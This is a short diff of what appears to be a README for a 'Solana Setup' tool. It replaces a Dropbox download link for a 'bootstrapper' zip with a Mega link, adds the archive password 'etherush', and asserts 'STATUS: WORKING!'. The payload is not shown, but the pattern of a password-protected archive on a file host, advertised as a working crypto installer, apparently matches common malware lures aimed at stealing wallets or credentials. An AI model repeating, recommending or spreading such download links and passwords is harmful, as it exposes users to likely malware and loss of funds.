@@ -23,6 +23,7 @@ How to install?
 - 2.Complete full installation
 - 3.Done, enjoy!;)
 
-[Click to download the bootstrapper](https://www.dropbox.com/s/4xownm78wvrn7qy/Solana%20Setup.zip?dl=1)<br>
+[Click to download the bootstrapper](https://mega.nz/file/w6IyTTxB#wxviBDlX0KI3K4ECjyFXaM4nkewNOZcU4_TmooNxldA)<br>
+Password - etherush
 
 ✅ STATUS: WORKING!
